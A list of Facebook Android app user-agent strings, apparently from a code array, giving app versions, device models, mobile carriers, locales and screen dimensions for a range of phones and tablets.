"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G900V;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=4.0,width=1440,height=2560};FBLC/fr_FR;FBCR/F-Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097196;FBDM/{density=4.0,width=1440,height=2560};FBLC/nb_NO;FBCR/N Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G925F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9080L;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454004;FBDM/{density=2.0,width=720,height=1280};FBLC/es_ES;FBCR/TIGO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454103;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G360F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454115;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBCR/;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1058;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One M8s;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/O2 - UK;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/3 IRL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Tesco Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/vodafone IE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G901F;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G903M;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=4.0,width=1440,height=2560};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=4.0,width=1440,height=2560};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920I;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748049;FBDM/{density=1.0,width=320,height=480};FBLC/en_US;FBCR/Verizon Wireless;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/VS415PP;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.3312501,width=1280,height=800};FBLC/en_GB;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T310;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748051;FBDM/{density=1.3312501,width=800,height=1280};FBLC/en_US;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T310;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 620;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC Desire 620;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Meteor;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One mini 2;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/EE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500M;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/es_LA;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SGH-I337M;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_GB;FBCR/Meteor;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1039;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/3;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D5503;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1184};FBLC/en_US;FBCR/Meteor;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E2303;FBSV/5.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1776};FBLC/en_GB;FBCR/3;FBMF/HTC;FBBD/htc;FBPN/com.facebook.katana;FBDV/HTC One_M8;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBCR/3;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G903F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/224.0.0.33.114;FBBV/157411939;FBDM/{density=1.5,width=480,height=888};FBLC/es_LA;FBRV/158579294;FBCR/AT&amp-T_4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto_e5_play;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/230.0.0.36.117;FBBV/162942688;FBDM/{density=3.0,width=1080,height=2218};FBLC/es_LA;FBRV/163945239;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX3;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/229.0.0.35.117;FBBV/162302399;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBRV/163241295;FBCR/AT&amp-T_4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto_E_(4);FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/228.0.0.41.124;FBBV/161383642;FBDM/{density=2.0,width=720,height=1193};FBLC/es_LA;FBRV/162589677;FBCR/TELCEL;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-M250;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/PAAA;FBAV/220.0.0.36.117;FBDM/{density=3.0,width=1080,height=1776};FBLC/es_LA;FBBV/162317126;FB_FW/2;FBSN/Android;FBCR/AT&amp-T_4G;FBMF/motorola;FBBD/motorola;FBDV/Moto_Z2_Play;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/229.0.0.35.117;FBBV/162302426;FBDM/{density=3.0,width=1080,height=2218};FBLC/es_LA;FBRV/162852558;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX3;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/230.0.0.36.117;FBBV/162942665;FBDM/{density=1.5,width=540,height=960};FBLC/es_LA;FBRV/164304498;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531H;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/228.0.0.41.124;FBBV/161383642;FBDM/{density=2.0,width=720,height=1208};FBLC/es_LA;FBRV/162589677;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SLA-L03;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/229.0.0.35.117;FBBV/162302399;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBRV/162837286;FBCR/Movistar;FBMF/Hisense;FBBD/Hisense;FBPN/com.facebook.katana;FBDV/Hisense_F23;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/228.0.0.41.124;FBBV/161383663;FBDM/{density=2.625,width=1080,height=1920};FBLC/es_LA;FBRV/162589677;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A720F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/229.0.0.35.117;FBBV/162302399;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBRV/162679285;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SM-J327A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/228.0.0.41.124;FBBV/161383656;FBDM/{density=1.5,width=540,height=888};FBLC/es_LA;FBRV/0;FBCR/MetroPCS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J260T1;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/257.0.0.44.118;FBBV/197851411;FBDM/{density=3.0,width=1080,height=2118};FBLC/en_US;FBRV/199646485;FBCR/Jio 4G;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1951;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/15.0.0.20.16;FBBV/3847306;FBDM/{density=0.75,width=480,height=764};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/RCT6378W2;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",	
"[FBAN/FB4A;FBAV/15.0.0.20.16;FBBV/3847314;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Optus;FBPN/com.facebook.katana;FBDV/HTC_One_XL;FBSV/4.2.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=3.5,width=1440,height=2730};FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/15.0.0.20.16;FBBV/3847306;FBDM/{density=0.75,width=240,height=320};FBLC/pt_BR;FBCR/Oi;FBPN/com.facebook.katana;FBDV/LG-E410f;FBSV/4.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/15.0.0.20.16;FBBV/3847312;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Boost_Mobile;FBPN/com.facebook.katana;FBDV/C6730;FBSV/4.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/229.0.0.35.117;FBBV/162302399;FBDM/{density=2.0,width=720,height=1280};FBLC/es_LA;FBRV/162837286;FBCR/Movistar;FBMF/Hisense;FBBD/Hisense;FBPN/com.facebook.katana;FBDV/Hisense_F23;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/228.0.0.41.124;FBBV/161383642;FBDM/{density=2.0,width=720,height=1208};FBLC/es_LA;FBRV/162589677;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SLA-L03;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/229.0.0.35.117;FBBV/162302426;FBDM/{density=3.0,width=1080,height=2218};FBLC/es_LA;FBRV/162852558;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX3;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/230.0.0.36.117;FBBV/162942688;FBDM/{density=3.0,width=1080,height=2218};FBLC/es_LA;FBRV/163945239;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX3;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/229.0.0.35.117;FBBV/162302399;FBDM/{density=2.0,width=720,height=1184};FBLC/es_LA;FBRV/163241295;FBCR/AT&amp-T_4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto_E_(4);FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/224.0.0.33.114;FBBV/157411939;FBDM/{density=1.5,width=480,height=888};FBLC/es_LA;FBRV/158579294;FBCR/AT&amp-T_4G;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto_e5_play;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/182.0.0.44.77;FBBV/118379529;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/180.0.0.35.82;FBBV/116984898;FBDM/{density=1.5,width=1200,height=1848};FBLC/fr_FR;FBRV/0;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/SGP512;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/180.0.0.35.82;FBBV/116984898;FBDM/{density=1.5,width=1920,height=1128};FBLC/fr_FR;FBRV/0;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/SGP512;FBSV/6.0.1;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/181.0.0.36.82;FBBV/117559209;FBDM/{density=2.55,width=1080,height=1798};FBLC/fr_FR;FBRV/0;FBCR/BASE;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3221;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/181.0.0.36.82;FBBV/117559209;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/180.0.0.35.82;FBBV/116984898;FBDM/{density=1.5,width=1200,height=1848};FBLC/fr_FR;FBRV/0;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/SGP512;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/180.0.0.35.82;FBBV/116984978;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/179.0.0.44.83;FBBV/116255751;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/178.0.0.57.86;FBBV/115496532;FBDM/{density=1.5,width=1200,height=1848};FBLC/fr_FR;FBRV/0;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/SGP512;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/178.0.0.57.86;FBBV/115496549;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/178.0.0.48.86;FBBV/115193280;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/177.0.0.57.105;FBBV/114690097;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/175.0.0.40.97;FBBV/111983765;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Telekom.de;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/172.0.0.66.93;FBBV/108396287;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/171.0.0.49.92;FBBV/107282091;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/107642243;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748722;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/105302482;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748722;FBDM/{density=2.55,width=1080,height=1798};FBLC/fr_FR;FBRV/0;FBCR/Swisscom;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3221;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/169.0.0.46.94;FBBV/104748722;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/167.0.0.42.94;FBBV/102203154;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/165.0.0.53.93;FBBV/99791903;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/165.0.0.53.93;FBBV/99791903;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/0;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/164.0.0.44.95;FBBV/98618556;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/98618556;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/160.0.0.30.94;FBBV/93146056;FBDM/{density=2.55,width=1080,height=1798};FBLC/fr_FR;FBRV/93146056;FBCR/Swisscom;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3221;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/160.0.0.30.94;FBBV/93146056;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/93146056;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/158.0.0.38.95;FBBV/90882265;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/91242720;FBCR/Movistar;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/157.0.0.38.97;FBBV/89915721;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/89915721;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=1920,height=1128};FBLC/fr_FR;FBRV/84570978;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/SGP512;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/85070460;FBCR/Sunrise;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G8141;FBSV/8.0.0;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/152.0.0.42.136;FBBV/83110613;FBDM/{density=3.0,width=1080,height=1776};FBLC/fr_FR;FBRV/83110613;FBCR/Swisscom;FBMF/TP-LINK;FBBD/Neffos;FBPN/com.facebook.katana;FBDV/Neffos C5 Max;FBSV/5.1;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/146.0.0.53.92;FBBV/75931108;FBDM/{density=1.5,width=1920,height=1128};FBLC/fr_FR;FBRV/75931108;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/SGP512;FBSV/6.0.1;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/141.0.0.31.91;FBBV/71725761;FBDM/{density=1.5,width=1200,height=1848};FBLC/fr_FR;FBRV/71725761;FBCR/;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/SGP512;FBSV/6.0.1;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
